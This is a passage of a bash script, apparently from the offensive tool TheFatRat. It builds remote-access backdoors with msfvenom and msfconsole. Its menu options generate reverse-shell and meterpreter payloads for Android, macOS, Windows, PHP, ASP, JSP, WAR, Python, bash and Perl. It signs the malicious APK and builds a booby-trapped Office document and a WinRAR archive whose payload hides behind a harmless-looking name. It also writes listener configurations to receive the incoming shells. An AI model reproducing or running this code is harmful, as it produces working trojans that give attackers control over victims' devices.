	if [ -z "$yourip" ]; then
	read -p '   Set LHOST IP: ' yourip
        fi
        if [ -z "$yourport" ]; then
        read -p '   Set LPORT: ' yourport
        fi
        echo ""
        read -p '   Please enter the base name for output files : ' fira
        invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
        pldand
        echo ""
	echo ""
	gboor
	spinlong
	echo ""
	echo -e $okegreen ""
        echo "[*] Creating RAT payload with msfvenom"
        sleep 1
	$msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $path/backdoored/$fira.apk >>$log /dev/null 2>&1
#check file
        outapk=$path/backdoored/$fira.apk
        if [ ! -f "$outapk" ]
        then
        echo -e $red ""
        echo "There was a problem in the creation of your rat apk file , make sure your metasploit is running correctly"
        echo -e $okegreen ""
        read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
        clear
        menu
        fi

        echo "[✔] Done!"
        echo "[*] Creating a Valid Certificate"
        sleep 1

        #Creating certificate and storing info in logfile

        $keytool -genkey -v -keystore $path/temp/debug.keystore -storepass android -alias androiddebugkey -keypass android -dname "CN=Android Debug,O=Android,C=US" -keyalg RSA -keysize 2048 -validity 10000 >>$log 2>&1
        cerapk=$path/temp/debug.keystore
        if [ ! -f "$cerapk" ]
        then
        echo -e $red ""
        echo "There was a problem creating a valid certificate ."
        echo -e $okegreen ""
        read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
        clear
        menu
        fi

        echo "[✔] Done!"
        echo "[*] Signing your payload APK"
        sleep 1
        $sign -verbose -keystore $path/temp/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $path/backdoored/$fira.apk androiddebugkey >>$log 2>&1
        echo "[✔] Done!"

        # After signing the apk file , android certificate is not needed anymore
        # deleting certificate

        rm $path/temp/debug.keystore
        sleep 1
        echo ""
        echo -e $okegreen "Do you want to create a listener for this configuration"
        echo -e $okegreen "to use in msfconsole in future ?"
        echo ""
        echo -ne "Choose y/n : ";tput sgr0
        read sel
        case $sel in
        y|Y|yes|Yes|YES)
        echo ""
        echo -e $green "Write the name for this config . (ex : payloadapk)"
        echo -ne "Filename : ";tput sgr0
        read fname
        if [ -z $fname ]
        then
        svf=$path/config/listeners/payloadapk.rc
        rm -rf $svf >/dev/null 2>&1
        echo "use exploit/multi/handler" > $svf
        echo "set PAYLOAD $payload" >> $svf
        echo "set LHOST $yourip" >> $svf
        echo "set LPORT $yourport" >> $svf
        echo "exploit -j" >> $svf
        echo -e $okegreen ""
        echo "Configuration file saved to $list/payloadapk.rc"
        else
        svf=$path/config/listeners/$fname.rc
        rm -rf $svf >/dev/null 2>&1
        echo "use exploit/multi/handler" > $svf
        echo "set PAYLOAD $payload" >> $svf
        echo "set LHOST $yourip" >> $svf
        echo "set LPORT $yourport" >> $svf
        echo "exploit -j" >> $svf
        echo -e $okegreen ""
        echo "Configuration file saved to $list/$fname.rc"
        fi
        # Checking if file was created
        fileout="$path/backdoored/$fira.apk"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your payload apk was created and signed , and it is located in : $fileout"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi
        ;;
        n|N|no|No|NO)
        # Checking if file was created
        fileout="$path/backdoored/$fira.apk"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your payload apk was created and signed , and it is located in : $fileout"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi
        ;;
        *)
        echo "Wrong input , returning to Msfvenom menu ."
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        ;;
        esac

	elif test $fatrat1 == '4'
	then
	echo ""
	spinlong
	echo -e $okegreen"\n"
	echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
	echo -e $yellow "  Your public IP address is : $publicip"
	echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
	echo -e $okegreen""
	if [ -z "$yourip" ]; then
	read -p '   Set LHOST IP: ' yourip
        fi
        echo -e $okegreen ""
        if [ -z "$yourport" ]; then
        read -p '   Set LPORT: ' yourport
        fi
        echo ""
        read -p '   Please enter the base name for output files : ' fira
        invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
	spinlong
	echo ""
	echo ""
	gboor
	spinlong
	echo ""
	echo ""
      	$msfvenom -p osx/x86/shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f macho > output/$fira.macho

# Checking if file was created
          fileout="$path/output/$fira.macho"
          if [ ! -f "$fileout" ]
          then
          echo -e $red ""
          echo "There was an error in the creation of your rat file"
          echo -e $okegreen ""
          echo -ne "Press [ENTER] key to return to menu ."
          read cont
          cmsfvenom
          else
          echo -e $okegreen ""
          echo "Your rat file was created , and it is located in : $fileout"
          echo ""
          echo -ne "Press [ENTER] key to return to menu ."
          read cont
          cmsfvenom
          fi
   	  elif test $fatrat1 == '5'
	  then
	  echo ""
	  spinlong
	  echo -e $okegreen"\n"
	  echo -e $yellow "  Your local IPV4 address is : $lanip"
          echo -e $yellow "  Your local IPV6 address is : $lanip6"
	  echo -e $yellow "  Your public IP address is : $publicip"
	  echo -e $yellow "  Your Hostname is : $hostn"
         if [ ! -f "$defcon" ]
         then
         yourip=""
         yourport=""
         fi
	 echo -e $okegreen""
	 if [ -z "$yourip" ]; then
	 read -p '   Set LHOST IP: ' yourip
        fi
        if [ -z "$yourport" ]; then
        read -p '   Set LPORT: ' yourport
        fi
        echo ""
        read -p '   Please enter the base name for output files : ' fira
        invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
	spinlong
	echo ""
	echo ""
	gboor
	spinlong2
	echo ""
	echo ""
        $msfvenom -p php/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.php
# Checking if file was created
        fileout="$path/output/$fira.php"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your rat file was created , and it is located in : $fileout"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi

	elif test $fatrat1 == '6'
	then
	echo ""
	spinlong
	echo -e $okegreen"\n"
	echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
	echo -e $yellow "  Your public IP address is : $publicip"
	echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
	echo -e $okegreen""
	if [ -z "$yourip" ]; then
	read -p '   Set LHOST IP: ' yourip
        fi

        echo -e $okegreen ""
        if [ -z "$yourport" ]; then
        read -p '   Set LPORT: ' yourport
        fi
        echo ""
        read -p '   Please enter the base name for output files : ' fira
        invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
	spinlong
	echo ""
	echo ""
	gboor
	spinlong
	echo ""
	echo ""
        $msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f asp > output/$fira.asp

# Checking if file was created
        fileout="$path/output/$fira.asp"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your rat file was created , and it is located in : $fileout"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi

	elif test $fatrat1 == '7'
	then
	echo ""
	spinlong
	echo -e $okegreen""
	echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
	echo -e $yellow "  Your public IP address is : $publicip"
	echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
	echo -e $okegreen""
	if [ -z "$yourip" ]; then
	read -p '   Set LHOST IP: ' yourip
        fi

        echo -e $okegreen ""
        if [ -z "$yourport" ]; then
        read -p '   Set LPORT: ' yourport
        fi
        echo ""
        read -p '   Please enter the base name for output files : ' fira
        invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
	spinlong
	echo ""
	echo ""
	gboor
	spinlong
	echo ""
	echo ""
    	$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > output/$fira.jsp

# Checking if file was created
        fileout="$path/output/$fira.jsp"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your rat file was created , and it is located in : $fileout"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi

	elif test $fatrat1 == '8'
	then
	echo ""
	spinlong
	echo -e $okegreen"\n"
	echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
	echo -e $yellow "  Your public IP address is : $publicip"
	echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
	echo -e $okegreen""
	if [ -z "$yourip" ]; then
	read -p '   Set LHOST IP: ' yourip
        fi

        echo -e $okegreen ""
        if [ -z "$yourport" ]; then
        read -p '   Set LPORT: ' yourport
        fi
        echo ""
        read -p '   Please enter the base name for output files : ' fira
        invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
	spinlong
	echo ""
	echo ""
	gboor
	spinlong2
	echo ""
	echo ""
      	$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f war > output/$fira.war
# Checking if file was created
        fileout="$path/output/$fira.war"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your rat file was created , and it is located in : $fileout"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi

	elif test $fatrat1 == '9'
	then
	echo ""
	spinlong
	echo -e $okegreen"\n"
	echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
	echo -e $yellow "  Your public IP address is : $publicip"
	echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
	echo -e $okegreen""
	if [ -z "$yourip" ]; then
	read -p '   Set LHOST IP: ' yourip
        fi

        echo -e $okegreen ""
        if [ -z "$yourport" ]; then
        read -p '   Set LPORT: ' yourport
        fi
        echo ""
        read -p '   Please enter the base name for output files : ' fira
        invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
	spinlong
	echo ""
	echo ""
	gboor
	spinlong
	echo ""
	echo ""
        $msfvenom -p cmd/unix/reverse_python LHOST=$yourip LPORT=$yourport -f raw > output/$fira.py
# Checking if file was created
fileout="$path/output/$fira.py"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your rat file was created , and it is located in : $fileout"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi

	elif test $fatrat1 == '10'
	then
	echo ""
	spinlong
	echo -e $okegreen"\n"
	echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
	echo -e $yellow "  Your public IP address is : $publicip"
	echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
	echo -e $okegreen""
	if [ -z "$yourip" ]; then
	read -p '   Set LHOST IP: ' yourip
        fi
        echo -e $okegreen ""
        if [ -z "$yourport" ]; then
        read -p '   Set LPORT: ' yourport
        fi
        echo ""
        read -p '   Please enter the base name for output files : ' fira
        invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
	spinlong
	echo ""
	echo ""
	gboor
	spinlong
	echo ""
	echo ""
      	$msfvenom -p cmd/unix/reverse_bash LHOST=$yourip LPORT=$yourport -f raw > output/$fira.sh

# Checking if file was created
        fileout="$path/output/$fira.sh"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your rat file was created , and it is located in : $fileout"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi

	elif test $fatrat1 == '11'
	then
	echo ""
	spinlong
	echo -e $okegreen"\n"
	echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
	echo -e $yellow "  Your public IP address is : $publicip"
	echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
	echo -e $okegreen""
        if [ -z "$yourip" ]; then
	read -p '   Set LHOST IP: ' yourip
        fi
        echo -e $okegreen ""
        if [ -z "$yourport" ]; then
        read -p '   Set LPORT: ' yourport
        fi
        echo ""
        read -p '   Please enter the base name for output files : ' fira
        invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
	spinlong
	echo ""
	echo ""
	gboor
	spinlong
	echo ""
	echo ""
    	$msfvenom -p cmd/unix/reverse_perl LHOST=$yourip LPORT=$yourport -f raw > output/$fira.pl
# Checking if file was created
        fileout="$path/output/$fira.pl"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your rat file was created , and it is located in : $fileout"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi

     	elif test $fatrat1 == '12'
       	then
        echo
	echo -e $red"  Worked on Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] "
	echo -e $okegreen"\n"
	echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
	echo -e $yellow "  Your public IP address is : $publicip"
	echo -e $yellow "  Your Hostname is : $hostn"
            if [ ! -f "$defcon" ]
            then
            yourip=""
            yourport=""
            fi
	    echo -e $okegreen""
            if [ -z "$yourip" ]; then
				read -p '   Set LHOST IP: ' yourip
                                fi
                                echo -e $okegreen ""
                                if [ -z "$yourport" ]; then
                                read -p '   Set LPORT: ' yourport
                                fi
				echo ""
				echo -ne $okegreen "  Please enter the base name for output files :" ;tput sgr0
				read fira
                                invalid
            if [ $err == "1" ]
            then
            echo -e $okegreen ""
            echo -n "Press [ENTER] key to return to menu ."
            read inp
            cmsfvenom
            fi
            echo ""
            pldwin
            spinlong
  	    echo ""
  	    echo ""
  	    gboor
  	    spinlong
  	    echo ""
            rm -rf ~/.msf4/local/* >/dev/null 2>&1
            xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/ms12_027_mscomctl_bof; set PAYLOAD $payload ; set FILENAME $fira.doc; set lhost $yourip ; set lport $yourport; exploit; exit -y'"
            echo ""
            mv ~/.msf4/local/$fira.doc $path/output/$fira.doc >/dev/null 2>&1
            echo -e $okegreen""
# Checking if file was created
            fileout="$path/output/$fira.doc"
            if [ ! -f "$fileout" ]
            then
            echo -e $red ""
            echo "There was an error in the creation of your rat file"
            echo -e $okegreen ""
            echo -ne "Press [ENTER] key to return to menu ."
            read cont
            cmsfvenom
            else
            echo -e $okegreen ""
            echo "Your rat file was created , and it is located in : $fileout"
            echo ""
            echo -ne "Press [ENTER] key to return to menu ."
            read cont
            cmsfvenom
            fi

	    elif test $fatrat1 == '13'
		 then
		 echo
  		 echo -e $red"  Worked on All Windows "
		 echo -e $okegreen"\n"
		 echo -e $yellow "  Your local IPV4 address is : $lanip"
 	         echo -e $yellow "  Your local IPV6 address is : $lanip6"
		 echo -e $yellow "  Your public IP address is : $publicip"
		 echo -e $yellow "  Your Hostname is : $hostn"
              if [ ! -f "$defcon" ]
              then
              yourip=""
              yourport=""
              fi
	      echo -e $okegreen""
	      if [ -z "$yourip" ]; then
	      read -p '   Set LHOST IP: ' yourip
              fi
              echo -e $okegreen ""
              if [ -z "$yourport" ]; then
              read -p '   Set LPORT: ' yourport
              fi
  	      echo -ne $okegreen "  Please enter the base name for output files ex: test.zip / test.rar):" ;tput sgr0
  	      read fira
              invalid
              if [ $err == "1" ]
              then
              echo -e $okegreen ""
              echo -n "Press [ENTER] key to return to menu ."
              read inp
              cmsfvenom
              fi
            	echo ""
            	echo -ne $okegreen " Please enter spoofed file name to show ex : stuff.txt :" ;tput sgr0
            	read fira2
                  if [ -z "$fira2" ]
                  then
                  fira2="stuff.txt"
                  fi
    		  echo ""
        	  pldwin
    		  spinlong
    		  echo ""
    		  echo ""
    		  gboor
    		  spinlong
    		  echo ""
              rm -rf ~/.msf4/local/* >/dev/null 2>&1
              xterm -T " TheFatRat < RAR BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/winrar_name_spoofing; set payload $payload; set FILENAME $fira; set SPOOF $fira2; set lhost $yourip; set lport $yourport; exploit; exit -y'"
              echo ""
              mv ~/.msf4/local/$fira $path/output/$fira

# Checking if file was created
            fileout="$path/output/$fira"
            if [ ! -f "$fileout" ]
            then
            echo -e $red ""
            echo "There was an error in the creation of your rat file"
            echo -e $okegreen ""
            echo -ne "Press [ENTER] key to return to menu ."
            read cont
            cmsfvenom
            else
            echo -e $okegreen ""
            echo "Your rat file was created , and it is located in : $fileout"
            echo ""
            echo -ne "Press [ENTER] key to return to menu ."
            read cont
            cmsfvenom
            fi

	elif test $fatrat1 == '14'
	then


	echo ""
	spinlong
	echo -e $okegreen"\n"
	echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
	echo -e $yellow "  Your public IP address is : $publicip"
	echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
	echo -e $okegreen""
	if [ -z "$yourip" ]; then
	read -p '   Set LHOST IP: ' yourip
        fi
        if [ -z "$yourport" ]; then
        echo ""
        read -p '   Set LPORT: ' yourport
        fi
        echo ""
        read -p '   Please enter the base name for output files : ' fira
	invalid
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        cmsfvenom
        fi
        pldwin
        spinlong
	echo ""
	echo ""
	gboor
	spinlong
	echo ""
	echo ""
	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f dll -o output/$fira.dll

# Checking if file was created
        fileout="output/$fira.dll"
        if [ ! -f "$fileout" ]
        then
        echo -e $red ""
        echo "There was an error in the creation of your rat file"
        echo -e $okegreen ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        else
        echo -e $okegreen ""
        echo "Your rat file was created and it is stored in : $path/output/$fira.dll"
        echo ""
        echo -ne "Press [ENTER] key to return to menu ."
        read cont
        cmsfvenom
        fi



	elif test $fatrat1 == '15'
	then
		clear
		menu
	 	else
		echo -e "  Incorrect Number"
		clear
		cmsfvenom
		fi

}

function clisteners() {
clear
echo -e $okegreen"  ===================================================================== "
echo -e " |  $cyan  Create Listener with metasploit ( must install metasploit )  $okegreen    | "
echo -e $okegreen"  ===================================================================== "
echo -e $red"   .____    .__          __                                     ";
echo "   |    |   |__| _______/  |_  ____   ____   ___________  ______"
echo "   |    |   |  |/  ___/\   __\/ __ \ /    \_/ __ \_  __ \/  ___/"
echo "   |    |___|  |\___ \  |  | \  ___/|   |  \  ___/|  | \/\___ \ "
echo "   |_______ \__/____  > |__|  \___  >___|  /\___  >__|  /____  >"
echo "           \/       \/            \/     \/     \/           \/ "
echo -e $"                                                               >> v1.3 "
echo -e $okegreen"  ===================================================================== "
echo -e " |                     $cyan        Created by $red Edo Maland  ( Screetsec )  $okegreen | "
echo -e $okegreen"  ===================================================================== "
			echo ""
 			echo -e $okegreen"	[1]  Listeners for payload linux"
 			echo -e "	[2]  Listeners for payload Windows"
			echo -e "        [3]  Listeners for payload Mac"
 			echo -e "	[4]  Listeners for payload Android"
      			echo -e "	[5]  Load a saved Listener"
			echo -e "        [6]  Back to Menu "
 			echo -e " "
  	 	echo -e $okegreen" ┌─["$red"TheFatRat$okegreen]──[$red~$okegreen]─["$yellow"listener$okegreen]:"
			echo -ne $okegreen" └─────► " ;tput sgr0
 			read fatrat1

			if test $fatrat1 == '1' #LINUX
				then
        spinlong
				rm temp/*.rc > /dev/null 2>&1
				touch "temp/meterpreter_linux.rc"
        echo use exploit/multi/handler > "temp/meterpreter_linux.rc"
				pldlnx
        echo set PAYLOAD $payload >> "temp/meterpreter_linux.rc"
				echo -e $okegreen""
				echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
				echo -e $yellow "  Your public IP address is : $publicip"
				echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
        spinlong
        echo ""
				echo -e $okegreen""
				read -p '   Set LHOST IP: ' yourip
        echo ""
        read -p '   Set LPORT: ' yourport
        invalid1
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "Press [ENTER] key to return to menu ."
        read inp
        clisteners
        fi
                echo set LHOST $yourip >> "temp/meterpreter_linux.rc"
           	 		echo set LPORT $yourport >> "temp/meterpreter_linux.rc"
           	 		echo set ExitOnSession false >> "temp/meterpreter_linux.rc"
           	 		echo exploit -j  >> "temp/meterpreter_linux.rc"
                        echo ""
                        echo -e $okegreen "  Do you want to save this configuration to use in future ?"
                        echo ""
                        echo -ne "   Choose y/n :" ;tput sgr0
                        read svl
                        case $svl in
                                y|Y|Yes|YES|yes)
                                echo ""
                                echo -e $okegreen "  Write the name for this config. (ex: linux-config)"
                                echo ""
                                echo -ne $okegreen "  Filename : " ;tput sgr0
                                read fln

#empty input then save as default name
                                if [ -z $fln ]
                                then
                                cp $path/temp/meterpreter_linux.rc $list/linux-config.rc >/dev/null 2>&1
                                echo "  Empty input detected , configuration file as linux-config.rc "
                                echo "  to: $list/linux-config.rc"
                                echo ""
                                echo -e $yellow ""
                                echo "  To load this configuration press on this menu 5 and select linux-config.rc"
                                echo ""
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu ."
                                read continue
                                clisteners
                                fi

#input detected
                                cp $path/temp/meterpreter_linux.rc $list/$fln.rc >/dev/null 2>&1
                                echo "  Configuration file saved as $fln.rc "
                                echo "to: $list/$fln.rc"
                                echo ""
                                echo -e $yellow ""
                                echo "  To load this configuration press on this menu 5 and select $fln.rc"
                                echo ""
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
;;
                                n|no|No|NO)
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
;;

                                *)
                                echo ""
                                echo -e $red "  Invalid Input"
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
;;
esac

			elif test $fatrat1 == '2' #Windows
				then
        spinlong
				touch "temp/meterpreter_windows.rc"
      	echo use exploit/multi/handler >> "temp/meterpreter_windows.rc"
				pldwin
        echo set PAYLOAD $payload >> "temp/meterpreter_windows.rc"
				postexp
				echo -e $okegreen""
				echo -e $yellow "  Your local IP address is : $lanip"
				echo -e $yellow "  Your public IP address is : $publicip"
				echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
        spinlong
        echo ""
				echo -e $okegreen""
           	 		read -p '  Set LHOST IP: ' yourip
                echo ""
           	 		read -p '  Set LPORT: ' yourport
                echo ""
                invalid1
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "  Press [ENTER] key to return to menu ."
        read inp
        clisteners
        fi
        echo set LHOST $yourip >> "temp/meterpreter_windows.rc"
        echo set LPORT $yourport >> "temp/meterpreter_windows.rc"
				echo set AutoRunScript multi_console_command -rc $pe >> "temp/meterpreter_windows.rc"
        echo set ExitOnSession false >> "temp/meterpreter_windows.rc"
        echo exploit -j  >> "temp/meterpreter_windows.rc"
        echo ""
        echo -e $okegreen "  Do you want to save this configuration to use in future ?"
                                echo ""
                                echo -ne "   Choose y/n :" ;tput sgr0
                                read svl
                                case $svl in
                                y|Y|Yes|YES|yes)
                                  echo ""
                                  echo -e $okegreen "  Write the name for this config. (ex: windows-config)"
                                  echo ""
                                  echo -ne $okegreen "  Filename : " ;tput sgr0
                                  read fln

#empty input then save as default name
                                if [ -z $fln ]
                                then
                                  cp $path/temp/meterpreter_windows.rc $list/windows-config.rc >/dev/null 2>&1
                                  echo "  Empty input detected , configuration file as windows-config.rc "
                                  echo "  to: $list/windows-config.rc"
                                  echo ""
                                  echo -e $yellow ""
                                  echo "  To load this configuration press on this menu 5 and select windows-config.rc"
                                  echo ""
                                  echo -e $okegreen ""
                                  echo -ne $okegreen"  Press [ENTER] key to return to menu ."
                                  read continue
                                  clisteners
                                fi

#input detected
                                cp $path/temp/meterpreter_windows.rc $list/$fln.rc >/dev/null 2>&1
                                echo "  Configuration file saved as $fln.rc "
                                echo "  to: $list/$fln.rc"
                                echo ""
                                echo -e $yellow ""
                                echo "  To load this configuration press on this menu 5 and select $fln.rc"
                                echo ""
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
                                ;;
                                n|no|No|NO)
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
                                ;;
                                *)
                                echo ""
                                echo -e $red "  Invalid Input"
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
;;
esac

 			  elif test $fatrat1 == '3'  #Mac
				    then
        spinlong
				rm temp/*.rc > /dev/null 2>&1
				touch "temp/meterpreter_mac.rc"
      	echo use exploit/multi/handler > "temp/meterpreter_mac.rc"
      	echo set PAYLOAD osx/x86/shell_reverse_tcp >> "temp/meterpreter_mac.rc"
				echo -e $okegreen""
				echo -e $yellow "  Your local IPV4 address is : $lanip"
        echo -e $yellow "  Your local IPV6 address is : $lanip6"
				echo -e $yellow "  Your public IP address is : $publicip"
				echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
        spinlong
        echo ""
				echo -e $okegreen""
           	 		read -p '  Set LHOST IP: ' yourip
                echo ""
           	 		read -p '  Set LPORT: ' yourport
                invalid1
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "  Press [ENTER] key to return to menu ."
        read inp
        clisteners
        fi
                echo set LHOST $yourip >> "temp/meterpreter_mac.rc"
           	 		echo set LPORT $yourport >> "temp/meterpreter_mac.rc"
           	 		echo set ExitOnSession false >> "temp/meterpreter_mac.rc"
           	 		echo exploit -j  >> "temp/meterpreter_mac.rc"
                echo ""
                echo -e $okegreen "  Do you want to save this configuration to use in future ?"
                                echo ""
                                echo -ne "   Choose y/n :" ;tput sgr0
                                read svl
                                case $svl in
                                y|Y|Yes|YES|yes)
                                echo ""
                                echo -e $okegreen "  Write the name for this config. (ex: mac-config)"
                                echo ""
                                echo -ne $cyan "  Filename : " ;tput sgr0
                                read fln

#empty input then save as default name
                if [ -z $fln ]
                                then
                                cp $path/temp/meterpreter_mac.rc $list/mac-config.rc >/dev/null 2>&1
                                echo "  Empty input detected , configuration file as mac-config.rc "
                                echo "  to: $list/mac-config.rc"
                                echo ""
                                echo -e $yellow ""
                                echo "  To load this configuration press on this menu 5 and select mac-config.rc"
                                echo ""
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu ."
                                read continue
                                clisteners
                                fi

#input detected
                                cp $path/temp/meterpreter_mac.rc $list/$fln.rc >/dev/null 2>&1
                                echo "  Configuration file saved as $fln.rc "
